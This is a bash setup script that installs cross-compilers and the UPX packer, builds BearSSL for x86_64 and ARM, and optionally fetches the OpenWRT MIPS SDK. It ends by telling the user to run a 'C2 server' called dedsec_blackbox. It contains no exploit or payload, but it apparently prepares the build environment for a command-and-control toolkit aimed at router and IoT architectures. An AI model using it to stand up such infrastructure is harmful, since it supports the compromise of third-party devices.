#!/usr/bin/env bash

set -euo pipefail

echo "[*] Installing system + build dependencies ..."
sudo apt-get update
sudo apt-get install -y \
  python3 python3-pip wget \
  python3-requests python3-tabulate \
  build-essential make upx \
  g++-arm-linux-gnueabihf g++-arm-linux-gnueabi g++-aarch64-linux-gnu

tar -xf "BearSSL.tar.gz"
rm -f "BearSSL.tar.gz"

echo
echo "[*] Building BearSSL static libs (x86_64 + ARMv7) ..."
( cd BearSSL && make clean && make lib CC=gcc AR=ar && cp build/libbearssl.a ../libbearssl_x86_64.a )
( cd BearSSL && make clean && make lib CC=arm-linux-gnueabihf-gcc AR=arm-linux-gnueabihf-ar && cp build/libbearssl.a ../libbearssl_arm.a )

echo
echo "[*] OpenWRT SDK (only needed to build the 'mipsel' target) ..."
read -r -p "    Download the OpenWRT SDK for MIPS now? (y/N) " ANS
if [[ "$ANS" =~ ^[Yy]$ ]]; then
    SDK="openwrt-sdk-23.05.4-ramips-mt7621_gcc-12.3.0_musl.Linux-x86_64"
    URL="https://downloads.openwrt.org/releases/23.05.4/targets/ramips/mt7621/${SDK}.tar.xz"
    echo "[*] Downloading ${URL} ..."
    wget -O "${SDK}.tar.xz" "$URL"
    tar xf "${SDK}.tar.xz"
    rm -f "${SDK}.tar.xz"
    echo "[+] OpenWRT SDK ready."
else
    echo "[!] Skipping MIPS SDK. You can build: debug / arm / armv5 / aarch64 now."
fi

echo
echo "[+] Setup complete."
echo "    Run the C2 server:  sudo ./dedsec_blackbox"
